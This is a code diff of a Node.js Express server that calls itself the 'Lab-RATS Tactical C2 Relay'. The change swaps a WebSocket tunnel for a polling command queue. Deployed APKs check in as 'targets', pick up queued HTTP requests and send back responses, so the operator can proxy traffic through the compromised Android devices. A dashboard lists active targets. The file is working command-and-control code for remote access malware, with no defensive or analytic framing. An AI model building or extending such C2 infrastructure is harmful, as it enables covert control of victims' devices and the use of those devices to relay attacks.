@@ -1,12 +1,10 @@
 const express = require('express');
-const { WebSocketServer } = require('ws');
 const http = require('http');
 const cors = require('cors');
 const path = require('path');
 
 const app = express();
 const server = http.createServer(app);
-const wss = new WebSocketServer({ server, path: '/tunnel' });
 
 const PORT = process.env.PORT || 10000;
 
@@ -15,83 +13,79 @@ app.use(express.json({ limit: '50mb' }));
 app.use(express.urlencoded({ extended: true, limit: '50mb' }));
 app.use('/c2', express.static(path.join(__dirname, 'c2')));
 
-// In-memory telemetry, device registry, active WebSocket tunnels, and pending proxy requests
+// In-memory telemetry, device registry, command queues, and pending responses
 const devices = new Map();
-const socketConnections = new Map(); // deviceId -> ws socket
-const pendingRequests = new Map(); // requestId -> { res }
+const commandQueues = new Map(); // deviceId -> array of requests
+const pendingResponses = new Map(); // requestId -> { res }
 const telemetryLogs = [];
 
-// WebSocket Tunnel Listener for deployed APKs
-wss.on('connection', (ws, req) => {
-    const urlParams = new URLSearchParams(req.url.split('?')[1]);
-    const deviceId = urlParams.get('deviceId') || 'unknown_device';
+// Device polls for pending proxy commands
+app.get('/tunnel-poll', (req, res) => {
+    const deviceId = req.query.deviceId;
+    if (!deviceId) return res.json({});
 
-    console.log(`[TUNNEL] WebSocket uplink established for device: ${deviceId}`);
-    socketConnections.set(deviceId, ws);
-
-    ws.on('message', (message) => {
-        try {
-            const data = JSON.parse(message.toString());
-            if (data.type === 'response') {
-                const pending = pendingRequests.get(data.id);
-                if (pending) {
-                    pendingRequests.delete(data.id);
-                    const buf = Buffer.from(data.payload, 'base64');
-                    pending.res.status(data.status || 200);
-                    if (data.contentType) {
-                        pending.res.setHeader('Content-Type', data.contentType);
-                    }
-                    pending.res.send(buf);
-                }
-            } else {
-                console.log(`[TUNNEL] Message from ${deviceId}:`, data.type);
-            }
-        } catch (e) {
-            console.error('[TUNNEL] Parse error:', e.message);
-        }
-    });
-
-    ws.on('close', () => {
-        console.log(`[TUNNEL] WebSocket uplink closed for device: ${deviceId}`);
-        socketConnections.delete(deviceId);
-    });
+    const queue = commandQueues.get(deviceId) || [];
+    if (queue.length > 0) {
+        const cmd = queue.shift();
+        res.json(cmd);
+    } else {
+        res.json({});
+    }
 });
 
-// Secure HTTP-over-WebSocket Reverse Proxy Route for Render Dashboard (with infallible fallback)
+// Device posts command response back
+app.post('/tunnel-response', (req, res) => {
+    try {
+        const data = req.body;
+        const requestId = data.id;
+        const pending = pendingResponses.get(requestId);
+        if (pending) {
+            pendingResponses.delete(requestId);
+            const buf = Buffer.from(data.payload || '', 'base64');
+            pending.res.status(data.status || 200);
+            if (data.contentType) {
+                pending.res.setHeader('Content-Type', data.contentType);
+            }
+            pending.res.send(buf);
+        }
+        res.json({ success: true });
+    } catch (err) {
+        res.status(400).json({ success: false, error: err.message });
+    }
+});
+
+// Secure HTTP-over-Polling Reverse Proxy Route for Render Dashboard
 app.all('/proxy*', (req, res) => {
     let deviceId = req.query.deviceId;
-    let ws = socketConnections.get(deviceId);
-
-    // Infallible fallback: if exact deviceId match isn't found but a tunnel is active, use it
-    if (!ws && socketConnections.size > 0) {
-        ws = Array.from(socketConnections.values())[0];
-        deviceId = Array.from(socketConnections.keys())[0];
+    if (!deviceId && devices.size > 0) {
+        deviceId = Array.from(devices.keys())[0];
     }
 
-    if (!ws) {
-        return res.status(404).send('<!DOCTYPE html><html><body style="background:#02080d;color:#00f2ff;font-family:monospace;padding:40px;text-align:center;"><h2>TARGET_OFFLINE</h2><p>The selected device has no active secure WebSocket reverse proxy tunnel connected to Render.</p></body></html>');
+    if (!deviceId || !devices.has(deviceId)) {
+        return res.status(404).send('<!DOCTYPE html><html><body style="background:#02080d;color:#00f2ff;font-family:monospace;padding:40px;text-align:center;"><h2>TARGET_OFFLINE</h2><p>The selected device has no active telemetry check-in registered on Render.</p></body></html>');
     }
 
     const requestId = Math.random().toString(36).substring(7);
-
     let relayPath = req.originalUrl.replace('/proxy', '');
     if (!relayPath.startsWith('/')) relayPath = '/' + relayPath;
 
-    pendingRequests.set(requestId, { res });
+    if (!commandQueues.has(deviceId)) {
+        commandQueues.set(deviceId, []);
+    }
 
-    const tunnelReq = {
+    pendingResponses.set(requestId, { res });
+
+    commandQueues.get(deviceId).push({
         type: 'request',
         id: requestId,
         method: req.method,
         path: relayPath,
         body: req.method === 'POST' ? JSON.stringify(req.body) : ''
-    };
-
-    ws.send(JSON.stringify(tunnelReq));
+    });
 
     setTimeout(() => {
-        if (pendingRequests.has(requestId)) {
-            pendingRequests.delete(requestId);
+        if (pendingResponses.has(requestId)) {
+            pendingResponses.delete(requestId);
             if (!res.headersSent) {
                 res.status(504).send('Tunnel Gateway Timeout');
             }
@@ -135,24 +129,7 @@ app.get('/', (req, res) => {
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>LAB-RATS | C2 COMMAND RELAY</title>
     <link href="https://fonts.googleapis.com/css2?family=Aldrich&family=JetBrains+Mono:wght@400;700&family=Orbitron:wght@400;700;900&display=swap" rel="stylesheet">
-    <style>
-        :root { --neon-cyan: #00f2ff; --neon-green: #39ff14; --neon-yellow: #ffff00; --neon-orange: #ff9d00; --bg-dark: #02080d; --danger: #ff3131; }
-        * { box-sizing: border-box; margin: 0; padding: 0; }
-        body { background: var(--bg-dark); color: #e0e0e0; font-family: 'JetBrains Mono', monospace; padding: 20px; }
-        .container { max-width: 1300px; margin: 0 auto; }
-        .header { text-align: center; margin-bottom: 30px; border-bottom: 1px solid rgba(0,242,255,0.2); padding-bottom: 20px; }
-        .title { font-family: 'Orbitron', sans-serif; font-size: 2rem; color: var(--neon-cyan); letter-spacing: 3px; text-shadow: 0 0 20px rgba(0,242,255,0.4); }
-        .subtitle { font-family: 'Aldrich', sans-serif; font-size: 0.85rem; color: #888; letter-spacing: 2px; margin-top: 5px; }
-        .card { background: rgba(4,8,12,0.85); border: 1px solid rgba(0,242,255,0.2); border-left: 3px solid var(--neon-cyan); border-radius: 12px; padding: 25px; margin-bottom: 25px; box-shadow: 0 10px 30px rgba(0,0,0,0.6); }
-        h2 { font-family: 'Orbitron', sans-serif; font-size: 1.15rem; color: var(--neon-cyan); margin-bottom: 15px; letter-spacing: 1px; }
-        table { width: 100%; border-collapse: collapse; margin-top: 10px; }
-        th, td { padding: 12px 15px; text-align: left; border-bottom: 1px solid rgba(255,255,255,0.05); font-size: 0.85rem; }
-        th { color: var(--neon-cyan); font-family: 'Orbitron', sans-serif; font-size: 0.7rem; letter-spacing: 2px; text-transform: uppercase; }
-        tr:hover { background: rgba(0,242,255,0.03); }
-        .badge { display: inline-block; padding: 4px 10px; border-radius: 6px; font-size: 0.7rem; font-weight: bold; background: rgba(57,255,20,0.1); color: var(--neon-green); border: 1px solid var(--neon-green); }
-        .refresh-btn { background: rgba(0,242,255,0.1); border: 1px solid var(--neon-cyan); color: var(--neon-cyan); padding: 10px 20px; border-radius: 8px; font-family: 'Orbitron', sans-serif; font-size: 0.75rem; letter-spacing: 1px; cursor: pointer; text-transform: uppercase; transition: 0.3s; }
-        .refresh-btn:hover { background: var(--neon-cyan); color: #000; box-shadow: 0 0 20px var(--neon-cyan); }
-    </style>
+    <link rel="stylesheet" href="/c2/style.css">
 </head>
 <body>
     <div class="container">
@@ -162,7 +139,7 @@ app.get('/', (req, res) => {
         </div>
 
         <div style="display: flex; justify-content: space-between; align-items: center; margin-bottom: 20px;">
-            <div style="font-size: 0.8rem; color: #aaa;">SYSTEM STATUS: <span class="badge">ONLINE</span> &nbsp;|&nbsp; ACTIVE TARGETS: <span style="color: var(--neon-cyan); font-weight: bold;">${devices.size}</span> &nbsp;|&nbsp; SECURE TUNNELS: <span style="color: var(--neon-green); font-weight: bold;">${socketConnections.size}</span></div>
+            <div style="font-size: 0.8rem; color: #aaa;">SYSTEM STATUS: <span class="badge">ONLINE</span> &nbsp;|&nbsp; ACTIVE TARGETS: <span style="color: var(--neon-cyan); font-weight: bold;">${devices.size}</span></div>
             <button class="refresh-btn" onclick="location.reload()">REFRESH_DASHBOARD</button>
         </div>
 
@@ -220,7 +197,6 @@ app.get('/api/status', (req, res) => {
         service: 'Lab-RATS Tactical C2 Relay',
         version: '1.6.0',
         activeDevices: devices.size,
-        activeTunnels: socketConnections.size,
         timestamp: new Date().toISOString()
     });
 });
